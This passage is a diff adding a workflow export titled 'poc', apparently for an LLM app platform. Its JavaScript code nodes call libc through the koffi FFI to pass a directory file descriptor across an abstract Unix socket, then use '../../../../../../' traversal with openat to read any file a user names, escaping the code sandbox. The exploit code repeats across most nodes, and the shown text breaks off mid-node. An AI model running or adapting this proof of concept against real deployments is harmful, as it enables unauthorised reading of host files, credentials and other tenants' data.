@@ -1,0 +1,964 @@
+app:
+  description: ''
+  icon: 🤖
+  icon_background: '#FFEAD5'
+  mode: workflow
+  name: poc
+  use_icon_as_answer_icon: false
+dependencies: []
+kind: app
+version: 0.6.0
+workflow:
+  conversation_variables: []
+  environment_variables: []
+  features:
+    file_upload:
+      allowed_file_extensions:
+      - .JPG
+      - .JPEG
+      - .PNG
+      - .GIF
+      - .WEBP
+      - .SVG
+      allowed_file_types:
+      - image
+      allowed_file_upload_methods:
+      - local_file
+      - remote_url
+      enabled: false
+      fileUploadConfig:
+        attachment_image_file_size_limit: 2
+        audio_file_size_limit: 50
+        batch_count_limit: 5
+        file_size_limit: 15
+        file_upload_limit: 20
+        image_file_batch_limit: 10
+        image_file_size_limit: 10
+        single_chunk_attachment_limit: 10
+        video_file_size_limit: 100
+        workflow_file_upload_limit: 10
+      image:
+        enabled: false
+        number_limits: 3
+        transfer_methods:
+        - local_file
+        - remote_url
+      number_limits: 3
+    opening_statement: ''
+    retriever_resource:
+      enabled: true
+    sensitive_word_avoidance:
+      enabled: false
+    speech_to_text:
+      enabled: false
+    suggested_questions: []
+    suggested_questions_after_answer:
+      enabled: false
+    text_to_speech:
+      enabled: false
+      language: ''
+      voice: ''
+  graph:
+    edges:
+    - data:
+        isInIteration: false
+        isInLoop: false
+        sourceType: start
+        targetType: code
+      id: 1772976648715-source-1772976656972-target
+      source: '1772976648715'
+      sourceHandle: source
+      target: '1772976656972'
+      targetHandle: target
+      type: custom
+      zIndex: 0
+    - data:
+        isInIteration: false
+        isInLoop: false
+        sourceType: start
+        targetType: code
+      id: 1772976648715-source-1772976711972-target
+      selected: false
+      source: '1772976648715'
+      sourceHandle: source
+      target: '1772976711972'
+      targetHandle: target
+      type: custom
+      zIndex: 0
+    - data:
+        isInIteration: false
+        isInLoop: false
+        sourceType: start
+        targetType: code
+      id: 1772976648715-source-1772976777890-target
+      source: '1772976648715'
+      sourceHandle: source
+      target: '1772976777890'
+      targetHandle: target
+      type: custom
+      zIndex: 0
+    - data:
+        isInIteration: false
+        isInLoop: false
+        sourceType: start
+        targetType: code
+      id: 1772976648715-source-1772976788202-target
+      source: '1772976648715'
+      sourceHandle: source
+      target: '1772976788202'
+      targetHandle: target
+      type: custom
+      zIndex: 0
+    - data:
+        isInIteration: false
+        isInLoop: false
+        sourceType: start
+        targetType: code
+      id: 1772976648715-source-1772976793226-target
+      selected: false
+      source: '1772976648715'
+      sourceHandle: source
+      target: '1772976793226'
+      targetHandle: target
+      type: custom
+      zIndex: 0
+    - data:
+        isInIteration: false
+        isInLoop: false
+        sourceType: start
+        targetType: code
+      id: 1772976648715-source-1772976798866-target
+      selected: false
+      source: '1772976648715'
+      sourceHandle: source
+      target: '1772976798866'
+      targetHandle: target
+      type: custom
+      zIndex: 0
+    - data:
+        isInIteration: false
+        isInLoop: false
+        sourceType: start
+        targetType: code
+      id: 1772976648715-source-1772977523779-target
+      source: '1772976648715'
+      sourceHandle: source
+      target: '1772977523779'
+      targetHandle: target
+      type: custom
+      zIndex: 0
+    - data:
+        isInIteration: false
+        isInLoop: false
+        sourceType: start
+        targetType: code
+      id: 1772976648715-source-1772977543754-target
+      source: '1772976648715'
+      sourceHandle: source
+      target: '1772977543754'
+      targetHandle: target
+      type: custom
+      zIndex: 0
+    - data:
+        isInIteration: false
+        isInLoop: false
+        sourceType: start
+        targetType: code
+      id: 1772976648715-source-1772977551443-target
+      source: '1772976648715'
+      sourceHandle: source
+      target: '1772977551443'
+      targetHandle: target
+      type: custom
+      zIndex: 0
+    - data:
+        isInIteration: false
+        isInLoop: false
+        sourceType: code
+        targetType: end
+      id: 1772976711972-source-1773047897494-target
+      source: '1772976711972'
+      sourceHandle: source
+      target: '1773047897494'
+      targetHandle: target
+      type: custom
+      zIndex: 0
+    - data:
+        isInLoop: false
+        sourceType: code
+        targetType: end
+      id: 1772976777890-source-1773047897494-target
+      source: '1772976777890'
+      sourceHandle: source
+      target: '1773047897494'
+      targetHandle: target
+      type: custom
+      zIndex: 0
+    - data:
+        isInLoop: false
+        sourceType: code
+        targetType: end
+      id: 1772976788202-source-1773047897494-target
+      source: '1772976788202'
+      sourceHandle: source
+      target: '1773047897494'
+      targetHandle: target
+      type: custom
+      zIndex: 0
+    - data:
+        isInLoop: false
+        sourceType: code
+        targetType: end
+      id: 1772976793226-source-1773047897494-target
+      source: '1772976793226'
+      sourceHandle: source
+      target: '1773047897494'
+      targetHandle: target
+      type: custom
+      zIndex: 0
+    - data:
+        isInLoop: false
+        sourceType: code
+        targetType: end
+      id: 1772976798866-source-1773047897494-target
+      source: '1772976798866'
+      sourceHandle: source
+      target: '1773047897494'
+      targetHandle: target
+      type: custom
+      zIndex: 0
+    - data:
+        isInLoop: false
+        sourceType: code
+        targetType: end
+      id: 1772977523779-source-1773047897494-target
+      source: '1772977523779'
+      sourceHandle: source
+      target: '1773047897494'
+      targetHandle: target
+      type: custom
+      zIndex: 0
+    - data:
+        isInLoop: false
+        sourceType: code
+        targetType: end
+      id: 1772977543754-source-1773047897494-target
+      source: '1772977543754'
+      sourceHandle: source
+      target: '1773047897494'
+      targetHandle: target
+      type: custom
+      zIndex: 0
+    - data:
+        isInLoop: false
+        sourceType: code
+        targetType: end
+      id: 1772977551443-source-1773047897494-target
+      source: '1772977551443'
+      sourceHandle: source
+      target: '1773047897494'
+      targetHandle: target
+      type: custom
+      zIndex: 0
+    nodes:
+    - data:
+        selected: false
+        title: User Input
+        type: start
+        variables:
+        - default: ''
+          hint: ''
+          label: path
+          options: []
+          placeholder: ''
+          required: true
+          type: text-input
+          variable: path
+      height: 109
+      id: '1772976648715'
+      position:
+        x: 80
+        y: 282
+      positionAbsolute:
+        x: 80
+        y: 282
+      selected: false
+      sourcePosition: right
+      targetPosition: left
+      type: custom
+      width: 242
+    - data:
+        code: "function main() {\n    // Constants\n    const AF_UNIX = 1\n    const\
+          \ SOCK_STREAM = 1\n    const AT_FDCWD = -100\n    const O_RDONLY = 0o000000\n\
+          \    const O_DIRECTORY = 0o200000\n    const SOL_SOCKET = 1\n    const SCM_RIGHTS\
+          \ = 1\n\n    const sock_addr = '\\x00test';\n\n    // Typedefs\n    const\
+          \ sa_family_t = koffi.alias('sa_family_t', 'uint16_t');\n    const socklen_t\
+          \ = koffi.alias('socklen_t', 'uint32_t');\n    const ssize_t = koffi.alias('ssize_t',\
+          \ 'int64_t');\n\n    // Structures\n    const sockaddr_un = koffi.struct('sockaddr_un',\
+          \ {\n        sun_family: 'sa_family_t',\n        sun_path: koffi.array('char',\
+          \ 108, 'String')\n    });\n\n    const iovec = koffi.struct('iovec', {\n\
+          \        iov_base: 'void *',\n        iov_len: 'size_t'\n    })\n\n    const\
+          \ cmsghdr = koffi.struct('cmsghdr', {\n        cmsg_len: 'size_t',\n   \
+          \     cmsg_level: 'int',\n        cmsg_type: 'int',\n        \n        //\
+          \ For single fd SCM_RIGHTS\n        fd: 'int',\n    })\n\n    const msghdr\
+          \ = koffi.struct('msghdr', {\n        msg_name: 'void *',\n        msg_namelen:\
+          \ 'socklen_t',\n        msg_iov: 'iovec *',\n        msg_iovlen: 'size_t',\n\
+          \        msg_control: 'cmsghdr *',\n        msg_controllen: 'size_t',\n\
+          \        msg_flags: 'int'\n    });\n\n    const l = koffi.load('libc.so.6');\n\
+          \n    // Functions\n    const socket = l.func('int socket(int domain, int\
+          \ type, int protocol)');\n    const bind = l.func('int bind(int sockfd,\
+          \ sockaddr_un *addr, socklen_t addrlen)');\n    const listen = l.func('int\
+          \ listen(int sockfd, int backlog)');\n    const accept = l.func('int accept(int\
+          \ sockfd, sockaddr_un *addr, socklen_t *addrlen)');\n    const openat =\
+          \ l.func('int openat(int dirfd, const char *pathname, int flags)');\n  \
+          \  const sendmsg = l.func('ssize_t sendmsg(int sockfd, msghdr *msg, int\
+          \ flags)');\n\n    dirfd = openat(AT_FDCWD, '.', O_RDONLY | O_DIRECTORY)\n\
+          \    console.log(dirfd, koffi.errno());\n\n    const sfd = socket(AF_UNIX,\
+          \ SOCK_STREAM, 0);\n    console.log(sfd, koffi.errno());\n\n    err = bind(sfd,\
+          \ {sun_family: AF_UNIX, sun_path: sock_addr}, 2 + sock_addr.length);\n \
+          \   console.log(err, koffi.errno());\n\n    err = listen(sfd, 1);\n    console.log(err,\
+          \ koffi.errno());\n\n    fd = accept(sfd, null, null);\n    console.log(fd,\
+          \ koffi.errno());\n\n    err = sendmsg(fd, {\n        msg_name: null,\n\
+          \        msg_namelen: 0,\n        msg_iov: {\n            iov_base: 'X',\n\
+          \            iov_len: 1\n        },\n        msg_iovlen: 1,\n        msg_control:\
+          \ {\n            cmsg_len: koffi.sizeof('cmsghdr'),\n            cmsg_level:\
+          \ SOL_SOCKET,\n            cmsg_type: SCM_RIGHTS,\n            fd: dirfd\n\
+          \        },\n        msg_controllen: koffi.sizeof('cmsghdr'),\n        msg_flags:\
+          \ 0,\n    }, 0)\n    console.log(err, koffi.errno());\n    return {\"a\"\
+          :1,\"b\":2};\n}"
+        code_language: javascript
+        outputs:
+          result:
+            children: null
+            type: string
+        retry_config:
+          max_retries: 3
+          retry_enabled: true
+          retry_interval: 1000
+        selected: false
+        title: listen
+        type: code
+        variables: []
+      height: 82
+      id: '1772976656972'
+      position:
+        x: 382
+        y: 153.3791736799526
+      positionAbsolute:
+        x: 382
+        y: 153.3791736799526
+      selected: false
+      sourcePosition: right
+      targetPosition: left
+      type: custom
+      width: 242
+    - data:
+        code: "function main({path}) {\n    // Constants\n    const AF_UNIX = 1\n\
+          \    const SOCK_STREAM = 1\n    const O_RDONLY = 0o000000\n\n    const sock_addr\
+          \ = '\\x00test';\n\n    // Typedefs\n    const sa_family_t = koffi.alias('sa_family_t',\
+          \ 'uint16_t');\n    const socklen_t = koffi.alias('socklen_t', 'uint32_t');\n\
+          \    const ssize_t = koffi.alias('ssize_t', 'int64_t');\n\n    // Structures\n\
+          \    const sockaddr_un = koffi.struct('sockaddr_un', {\n        sun_family:\
+          \ 'sa_family_t',\n        sun_path: koffi.array('char', 108, 'String')\n\
+          \    });\n\n    const iovec = koffi.struct('iovec', {\n        iov_base:\
+          \ 'void *',\n        iov_len: 'size_t'\n    })\n\n    const cmsghdr = koffi.struct('cmsghdr',\
+          \ {\n        cmsg_len: 'size_t',\n        cmsg_level: 'int',\n        cmsg_type:\
+          \ 'int',\n        \n        // For single fd SCM_RIGHTS\n        fd: 'int',\n\
+          \    })\n\n    const msghdr = koffi.struct('msghdr', {\n        msg_name:\
+          \ 'void *',\n        msg_namelen: 'socklen_t',\n        msg_iov: 'iovec\
+          \ *',\n        msg_iovlen: 'size_t',\n        msg_control: 'void *',\n \
+          \       msg_controllen: 'size_t',\n        msg_flags: 'int'\n    });\n\n\
+          \    const timespec = koffi.struct('timespec', {\n        tv_sec: 'int64_t',\n\
+          \        tv_nsec: 'int64_t',\n    });\n\n    const l = koffi.load('libc.so.6');\n\
+          \n    // Functions\n    const socket = l.func('int socket(int domain, int\
+          \ type, int protocol)');\n    const connect = l.func('int connect(int sockfd,\
+          \ sockaddr_un *addr, socklen_t addrlen)');\n    const recvmsg = l.func('ssize_t\
+          \ recvmsg(int sockfd, _Inout_ msghdr *msg, int flags)');\n    const openat\
+          \ = l.func('int openat(int dirfd, const char *pathname, int flags)');\n\
+          \    const read = l.func('ssize_t read(int fd, _Out_ char *buf, size_t count)');\n\
+          \    const nanosleep = l.func('long syscall(long number, timespec *arg1,\
+          \ timespec *arg2)');\n\n    nanosleep(35, {\n        tv_sec: 1,\n      \
+          \  tv_nsec: 0\n    }, null);\n\n    const sfd = socket(AF_UNIX, SOCK_STREAM,\
+          \ 0);\n    console.log(sfd, koffi.errno());\n\n    err = connect(sfd, {sun_family:\
+          \ AF_UNIX, sun_path: sock_addr}, 2 + sock_addr.length);\n\n    if (err <\
+          \ 0) {\n        return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    buf = koffi.alloc('char', koffi.sizeof('cmsghdr'))\n\
+          \n    msg = {\n        msg_control: buf,\n        msg_controllen: koffi.sizeof('cmsghdr'),\n\
+          \    }\n\n    err = recvmsg(sfd, msg, 0);\n    console.log(err, koffi.errno());\n\
+          \n    cmsg = koffi.decode(buf, 'cmsghdr');\n    \n    if (err < 0) {\n \
+          \       return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    fd = openat(cmsg.fd, \"../../../../../../\" + path,\
+          \ O_RDONLY);\n    \n    if (fd < 0) {\n        return {\n            result:\
+          \ fd.toString() + ' ' + koffi.errno()\n        }\n    }\n\n    fbuf = koffi.alloc('char',\
+          \ 0x10000);\n    err = read(fd, fbuf, 0x10000);\n    \n    if (err < 0)\
+          \ {\n        return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    return {\n        result: koffi.decode(fbuf, 'char',\
+          \ err)\n    }\n}"
+        code_language: javascript
+        outputs:
+          result:
+            children: null
+            type: string
+        selected: false
+        title: Receive
+        type: code
+        variables:
+        - value_selector:
+          - '1772976648715'
+          - path
+          value_type: string
+          variable: path
+      height: 52
+      id: '1772976711972'
+      position:
+        x: 382
+        y: 248.9739670999407
+      positionAbsolute:
+        x: 382
+        y: 248.9739670999407
+      selected: true
+      sourcePosition: right
+      targetPosition: left
+      type: custom
+      width: 242
+    - data:
+        code: "function main({path}) {\n    // Constants\n    const AF_UNIX = 1\n\
+          \    const SOCK_STREAM = 1\n    const O_RDONLY = 0o000000\n\n    const sock_addr\
+          \ = '\\x00test';\n\n    // Typedefs\n    const sa_family_t = koffi.alias('sa_family_t',\
+          \ 'uint16_t');\n    const socklen_t = koffi.alias('socklen_t', 'uint32_t');\n\
+          \    const ssize_t = koffi.alias('ssize_t', 'int64_t');\n\n    // Structures\n\
+          \    const sockaddr_un = koffi.struct('sockaddr_un', {\n        sun_family:\
+          \ 'sa_family_t',\n        sun_path: koffi.array('char', 108, 'String')\n\
+          \    });\n\n    const iovec = koffi.struct('iovec', {\n        iov_base:\
+          \ 'void *',\n        iov_len: 'size_t'\n    })\n\n    const cmsghdr = koffi.struct('cmsghdr',\
+          \ {\n        cmsg_len: 'size_t',\n        cmsg_level: 'int',\n        cmsg_type:\
+          \ 'int',\n        \n        // For single fd SCM_RIGHTS\n        fd: 'int',\n\
+          \    })\n\n    const msghdr = koffi.struct('msghdr', {\n        msg_name:\
+          \ 'void *',\n        msg_namelen: 'socklen_t',\n        msg_iov: 'iovec\
+          \ *',\n        msg_iovlen: 'size_t',\n        msg_control: 'void *',\n \
+          \       msg_controllen: 'size_t',\n        msg_flags: 'int'\n    });\n\n\
+          \    const timespec = koffi.struct('timespec', {\n        tv_sec: 'int64_t',\n\
+          \        tv_nsec: 'int64_t',\n    });\n\n    const l = koffi.load('libc.so.6');\n\
+          \n    // Functions\n    const socket = l.func('int socket(int domain, int\
+          \ type, int protocol)');\n    const connect = l.func('int connect(int sockfd,\
+          \ sockaddr_un *addr, socklen_t addrlen)');\n    const recvmsg = l.func('ssize_t\
+          \ recvmsg(int sockfd, _Inout_ msghdr *msg, int flags)');\n    const openat\
+          \ = l.func('int openat(int dirfd, const char *pathname, int flags)');\n\
+          \    const read = l.func('ssize_t read(int fd, _Out_ char *buf, size_t count)');\n\
+          \    const nanosleep = l.func('long syscall(long number, timespec *arg1,\
+          \ timespec *arg2)');\n\n    nanosleep(35, {\n        tv_sec: 1,\n      \
+          \  tv_nsec: 0\n    }, null);\n\n    const sfd = socket(AF_UNIX, SOCK_STREAM,\
+          \ 0);\n    console.log(sfd, koffi.errno());\n\n    err = connect(sfd, {sun_family:\
+          \ AF_UNIX, sun_path: sock_addr}, 2 + sock_addr.length);\n\n    if (err <\
+          \ 0) {\n        return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    buf = koffi.alloc('char', koffi.sizeof('cmsghdr'))\n\
+          \n    msg = {\n        msg_control: buf,\n        msg_controllen: koffi.sizeof('cmsghdr'),\n\
+          \    }\n\n    err = recvmsg(sfd, msg, 0);\n    console.log(err, koffi.errno());\n\
+          \n    cmsg = koffi.decode(buf, 'cmsghdr');\n    \n    if (err < 0) {\n \
+          \       return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    fd = openat(cmsg.fd, \"../../../../../../\" + path,\
+          \ O_RDONLY);\n    \n    if (fd < 0) {\n        return {\n            result:\
+          \ fd.toString() + ' ' + koffi.errno()\n        }\n    }\n\n    fbuf = koffi.alloc('char',\
+          \ 0x10000);\n    err = read(fd, fbuf, 0x10000);\n    \n    if (err < 0)\
+          \ {\n        return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    return {\n        result: koffi.decode(fbuf, 'char',\
+          \ err)\n    }\n}"
+        code_language: javascript
+        outputs:
+          result:
+            children: null
+            type: string
+        selected: false
+        title: Code 3
+        type: code
+        variables:
+        - value_selector:
+          - '1772976648715'
+          - path
+          value_type: string
+          variable: path
+      height: 52
+      id: '1772976777890'
+      position:
+        x: 382
+        y: 317
+      positionAbsolute:
+        x: 382
+        y: 317
+      selected: false
+      sourcePosition: right
+      targetPosition: left
+      type: custom
+      width: 242
+    - data:
+        code: "function main({path}) {\n    // Constants\n    const AF_UNIX = 1\n\
+          \    const SOCK_STREAM = 1\n    const O_RDONLY = 0o000000\n\n    const sock_addr\
+          \ = '\\x00test';\n\n    // Typedefs\n    const sa_family_t = koffi.alias('sa_family_t',\
+          \ 'uint16_t');\n    const socklen_t = koffi.alias('socklen_t', 'uint32_t');\n\
+          \    const ssize_t = koffi.alias('ssize_t', 'int64_t');\n\n    // Structures\n\
+          \    const sockaddr_un = koffi.struct('sockaddr_un', {\n        sun_family:\
+          \ 'sa_family_t',\n        sun_path: koffi.array('char', 108, 'String')\n\
+          \    });\n\n    const iovec = koffi.struct('iovec', {\n        iov_base:\
+          \ 'void *',\n        iov_len: 'size_t'\n    })\n\n    const cmsghdr = koffi.struct('cmsghdr',\
+          \ {\n        cmsg_len: 'size_t',\n        cmsg_level: 'int',\n        cmsg_type:\
+          \ 'int',\n        \n        // For single fd SCM_RIGHTS\n        fd: 'int',\n\
+          \    })\n\n    const msghdr = koffi.struct('msghdr', {\n        msg_name:\
+          \ 'void *',\n        msg_namelen: 'socklen_t',\n        msg_iov: 'iovec\
+          \ *',\n        msg_iovlen: 'size_t',\n        msg_control: 'void *',\n \
+          \       msg_controllen: 'size_t',\n        msg_flags: 'int'\n    });\n\n\
+          \    const timespec = koffi.struct('timespec', {\n        tv_sec: 'int64_t',\n\
+          \        tv_nsec: 'int64_t',\n    });\n\n    const l = koffi.load('libc.so.6');\n\
+          \n    // Functions\n    const socket = l.func('int socket(int domain, int\
+          \ type, int protocol)');\n    const connect = l.func('int connect(int sockfd,\
+          \ sockaddr_un *addr, socklen_t addrlen)');\n    const recvmsg = l.func('ssize_t\
+          \ recvmsg(int sockfd, _Inout_ msghdr *msg, int flags)');\n    const openat\
+          \ = l.func('int openat(int dirfd, const char *pathname, int flags)');\n\
+          \    const read = l.func('ssize_t read(int fd, _Out_ char *buf, size_t count)');\n\
+          \    const nanosleep = l.func('long syscall(long number, timespec *arg1,\
+          \ timespec *arg2)');\n\n    nanosleep(35, {\n        tv_sec: 1,\n      \
+          \  tv_nsec: 0\n    }, null);\n\n    const sfd = socket(AF_UNIX, SOCK_STREAM,\
+          \ 0);\n    console.log(sfd, koffi.errno());\n\n    err = connect(sfd, {sun_family:\
+          \ AF_UNIX, sun_path: sock_addr}, 2 + sock_addr.length);\n\n    if (err <\
+          \ 0) {\n        return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    buf = koffi.alloc('char', koffi.sizeof('cmsghdr'))\n\
+          \n    msg = {\n        msg_control: buf,\n        msg_controllen: koffi.sizeof('cmsghdr'),\n\
+          \    }\n\n    err = recvmsg(sfd, msg, 0);\n    console.log(err, koffi.errno());\n\
+          \n    cmsg = koffi.decode(buf, 'cmsghdr');\n    \n    if (err < 0) {\n \
+          \       return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    fd = openat(cmsg.fd, \"../../../../../../\" + path,\
+          \ O_RDONLY);\n    \n    if (fd < 0) {\n        return {\n            result:\
+          \ fd.toString() + ' ' + koffi.errno()\n        }\n    }\n\n    fbuf = koffi.alloc('char',\
+          \ 0x10000);\n    err = read(fd, fbuf, 0x10000);\n    \n    if (err < 0)\
+          \ {\n        return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    return {\n        result: koffi.decode(fbuf, 'char',\
+          \ err)\n    }\n}"
+        code_language: javascript
+        outputs:
+          result:
+            children: null
+            type: string
+        selected: false
+        title: Code 4
+        type: code
+        variables:
+        - value_selector:
+          - '1772976648715'
+          - path
+          value_type: string
+          variable: path
+      height: 52
+      id: '1772976788202'
+      position:
+        x: 382
+        y: 409
+      positionAbsolute:
+        x: 382
+        y: 409
+      selected: false
+      sourcePosition: right
+      targetPosition: left
+      type: custom
+      width: 242
+    - data:
+        code: "function main({path}) {\n    // Constants\n    const AF_UNIX = 1\n\
+          \    const SOCK_STREAM = 1\n    const O_RDONLY = 0o000000\n\n    const sock_addr\
+          \ = '\\x00test';\n\n    // Typedefs\n    const sa_family_t = koffi.alias('sa_family_t',\
+          \ 'uint16_t');\n    const socklen_t = koffi.alias('socklen_t', 'uint32_t');\n\
+          \    const ssize_t = koffi.alias('ssize_t', 'int64_t');\n\n    // Structures\n\
+          \    const sockaddr_un = koffi.struct('sockaddr_un', {\n        sun_family:\
+          \ 'sa_family_t',\n        sun_path: koffi.array('char', 108, 'String')\n\
+          \    });\n\n    const iovec = koffi.struct('iovec', {\n        iov_base:\
+          \ 'void *',\n        iov_len: 'size_t'\n    })\n\n    const cmsghdr = koffi.struct('cmsghdr',\
+          \ {\n        cmsg_len: 'size_t',\n        cmsg_level: 'int',\n        cmsg_type:\
+          \ 'int',\n        \n        // For single fd SCM_RIGHTS\n        fd: 'int',\n\
+          \    })\n\n    const msghdr = koffi.struct('msghdr', {\n        msg_name:\
+          \ 'void *',\n        msg_namelen: 'socklen_t',\n        msg_iov: 'iovec\
+          \ *',\n        msg_iovlen: 'size_t',\n        msg_control: 'void *',\n \
+          \       msg_controllen: 'size_t',\n        msg_flags: 'int'\n    });\n\n\
+          \    const timespec = koffi.struct('timespec', {\n        tv_sec: 'int64_t',\n\
+          \        tv_nsec: 'int64_t',\n    });\n\n    const l = koffi.load('libc.so.6');\n\
+          \n    // Functions\n    const socket = l.func('int socket(int domain, int\
+          \ type, int protocol)');\n    const connect = l.func('int connect(int sockfd,\
+          \ sockaddr_un *addr, socklen_t addrlen)');\n    const recvmsg = l.func('ssize_t\
+          \ recvmsg(int sockfd, _Inout_ msghdr *msg, int flags)');\n    const openat\
+          \ = l.func('int openat(int dirfd, const char *pathname, int flags)');\n\
+          \    const read = l.func('ssize_t read(int fd, _Out_ char *buf, size_t count)');\n\
+          \    const nanosleep = l.func('long syscall(long number, timespec *arg1,\
+          \ timespec *arg2)');\n\n    nanosleep(35, {\n        tv_sec: 1,\n      \
+          \  tv_nsec: 0\n    }, null);\n\n    const sfd = socket(AF_UNIX, SOCK_STREAM,\
+          \ 0);\n    console.log(sfd, koffi.errno());\n\n    err = connect(sfd, {sun_family:\
+          \ AF_UNIX, sun_path: sock_addr}, 2 + sock_addr.length);\n\n    if (err <\
+          \ 0) {\n        return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    buf = koffi.alloc('char', koffi.sizeof('cmsghdr'))\n\
+          \n    msg = {\n        msg_control: buf,\n        msg_controllen: koffi.sizeof('cmsghdr'),\n\
+          \    }\n\n    err = recvmsg(sfd, msg, 0);\n    console.log(err, koffi.errno());\n\
+          \n    cmsg = koffi.decode(buf, 'cmsghdr');\n    \n    if (err < 0) {\n \
+          \       return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    fd = openat(cmsg.fd, \"../../../../../../\" + path,\
+          \ O_RDONLY);\n    \n    if (fd < 0) {\n        return {\n            result:\
+          \ fd.toString() + ' ' + koffi.errno()\n        }\n    }\n\n    fbuf = koffi.alloc('char',\
+          \ 0x10000);\n    err = read(fd, fbuf, 0x10000);\n    \n    if (err < 0)\
+          \ {\n        return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    return {\n        result: koffi.decode(fbuf, 'char',\
+          \ err)\n    }\n}"
+        code_language: javascript
+        outputs:
+          result:
+            children: null
+            type: string
+        selected: false
+        title: Code 5
+        type: code
+        variables:
+        - value_selector:
+          - '1772976648715'
+          - path
+          value_type: string
+          variable: paht
+      height: 52
+      id: '1772976793226'
+      position:
+        x: 382
+        y: 495.04147626768145
+      positionAbsolute:
+        x: 382
+        y: 495.04147626768145
+      selected: false
+      sourcePosition: right
+      targetPosition: left
+      type: custom
+      width: 242
+    - data:
+        code: "function main({path}) {\n    // Constants\n    const AF_UNIX = 1\n\
+          \    const SOCK_STREAM = 1\n    const O_RDONLY = 0o000000\n\n    const sock_addr\
+          \ = '\\x00test';\n\n    // Typedefs\n    const sa_family_t = koffi.alias('sa_family_t',\
+          \ 'uint16_t');\n    const socklen_t = koffi.alias('socklen_t', 'uint32_t');\n\
+          \    const ssize_t = koffi.alias('ssize_t', 'int64_t');\n\n    // Structures\n\
+          \    const sockaddr_un = koffi.struct('sockaddr_un', {\n        sun_family:\
+          \ 'sa_family_t',\n        sun_path: koffi.array('char', 108, 'String')\n\
+          \    });\n\n    const iovec = koffi.struct('iovec', {\n        iov_base:\
+          \ 'void *',\n        iov_len: 'size_t'\n    })\n\n    const cmsghdr = koffi.struct('cmsghdr',\
+          \ {\n        cmsg_len: 'size_t',\n        cmsg_level: 'int',\n        cmsg_type:\
+          \ 'int',\n        \n        // For single fd SCM_RIGHTS\n        fd: 'int',\n\
+          \    })\n\n    const msghdr = koffi.struct('msghdr', {\n        msg_name:\
+          \ 'void *',\n        msg_namelen: 'socklen_t',\n        msg_iov: 'iovec\
+          \ *',\n        msg_iovlen: 'size_t',\n        msg_control: 'void *',\n \
+          \       msg_controllen: 'size_t',\n        msg_flags: 'int'\n    });\n\n\
+          \    const timespec = koffi.struct('timespec', {\n        tv_sec: 'int64_t',\n\
+          \        tv_nsec: 'int64_t',\n    });\n\n    const l = koffi.load('libc.so.6');\n\
+          \n    // Functions\n    const socket = l.func('int socket(int domain, int\
+          \ type, int protocol)');\n    const connect = l.func('int connect(int sockfd,\
+          \ sockaddr_un *addr, socklen_t addrlen)');\n    const recvmsg = l.func('ssize_t\
+          \ recvmsg(int sockfd, _Inout_ msghdr *msg, int flags)');\n    const openat\
+          \ = l.func('int openat(int dirfd, const char *pathname, int flags)');\n\
+          \    const read = l.func('ssize_t read(int fd, _Out_ char *buf, size_t count)');\n\
+          \    const nanosleep = l.func('long syscall(long number, timespec *arg1,\
+          \ timespec *arg2)');\n\n    nanosleep(35, {\n        tv_sec: 1,\n      \
+          \  tv_nsec: 0\n    }, null);\n\n    const sfd = socket(AF_UNIX, SOCK_STREAM,\
+          \ 0);\n    console.log(sfd, koffi.errno());\n\n    err = connect(sfd, {sun_family:\
+          \ AF_UNIX, sun_path: sock_addr}, 2 + sock_addr.length);\n\n    if (err <\
+          \ 0) {\n        return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    buf = koffi.alloc('char', koffi.sizeof('cmsghdr'))\n\
+          \n    msg = {\n        msg_control: buf,\n        msg_controllen: koffi.sizeof('cmsghdr'),\n\
+          \    }\n\n    err = recvmsg(sfd, msg, 0);\n    console.log(err, koffi.errno());\n\
+          \n    cmsg = koffi.decode(buf, 'cmsghdr');\n    \n    if (err < 0) {\n \
+          \       return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    fd = openat(cmsg.fd, \"../../../../../../\" + path,\
+          \ O_RDONLY);\n    \n    if (fd < 0) {\n        return {\n            result:\
+          \ fd.toString() + ' ' + koffi.errno()\n        }\n    }\n\n    fbuf = koffi.alloc('char',\
+          \ 0x10000);\n    err = read(fd, fbuf, 0x10000);\n    \n    if (err < 0)\
+          \ {\n        return {\n            result: err.toString() + ' ' + koffi.errno()\n\
+          \        }\n    }\n\n    return {\n        result: koffi.decode(fbuf, 'char',\
+          \ err)\n    }\n}"
+        code_language: javascript
+        outputs:
+          result:
+            children: null
+            type: string
+        selected: false
+        title: Code 6
+        type: code
+        variables:
+        - value_selector:
+          - '1772976648715'
+          - path
+          value_type: string
+          variable: path
+      height: 52
+      id: '1772976798866'
+      position:
+        x: 382
+        y: 590
+      positionAbsolute:
+        x: 382
+        y: 590
+      selected: false
+      sourcePosition: right
+      targetPosition: left
+      type: custom
+      width: 242
+    - data:
+        code: "function main({path}) {\n    // Constants\n    const AF_UNIX = 1\n\
+          \    const SOCK_STREAM = 1\n    const O_RDONLY = 0o000000\n\n    const sock_addr\
+          \ = '\\x00test';\n\n    // Typedefs\n    const sa_family_t = koffi.alias('sa_family_t',\
+          \ 'uint16_t');\n    const socklen_t = koffi.alias('socklen_t', 'uint32_t');\n\
+          \    const ssize_t = koffi.alias('ssize_t', 'int64_t');\n\n    // Structures\n\
+          \    const sockaddr_un = koffi.struct('sockaddr_un', {\n        sun_family:\
+          \ 'sa_family_t',\n        sun_path: koffi.array('char', 108, 'String')\n\
+          \    });\n\n    const iovec = koffi.struct('iovec', {\n        iov_base:\
+          \ 'void *',\n        iov_len: 'size_t'\n    })\n\n    const cmsghdr = koffi.struct('cmsghdr',\
+          \ {\n        cmsg_len: 'size_t',\n        cmsg_level: 'int',\n        cmsg_type:\
